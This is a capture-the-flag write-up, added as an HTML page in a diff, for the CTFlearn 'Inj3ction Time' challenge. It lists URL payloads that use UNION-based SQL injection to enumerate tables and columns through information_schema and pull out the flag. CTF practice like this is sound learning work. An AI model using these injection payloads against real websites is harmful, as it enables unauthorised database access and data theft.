@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Inj3ction Time</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Inj3ction Time</h1>
+</header>
+<p>View dog information of id 1, the url changes to</p>
+<pre><code>https://web.ctflearn.com/web8/?id=1</code></pre>
+<p>Test injection with UNION</p>
+<pre><code>https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,3,4</code></pre>
+<pre><code>https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,table_name,4%20from%20information_schema.tables%20where%20table_schema=database()</code></pre>
+<p>There are two extra tables shown in result page, <code>w0w_y0u_f0und_m3</code> and <code>webeight</code></p>
+<p>Try to find out the column names.</p>
+<pre><code>https://web.ctflearn.com/web8/?id=1%20union%20select%201,table_name,column_name,4%20from%20information_schema.columns%20where%20table_schema=database()</code></pre>
+<p>The pages shows <code>w0w_y0u_f0und_m3</code> contains one column, <code>f0und_m3</code>. Get values of <code>f0und_m3</code></p>
+<pre><code>https://web.ctflearn.com/web8/?id=1%20union%20select%201,2,f0und_m3,4%20from%20w0w_y0u_f0und_m3</code></pre>
+<p>The flag is shown.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
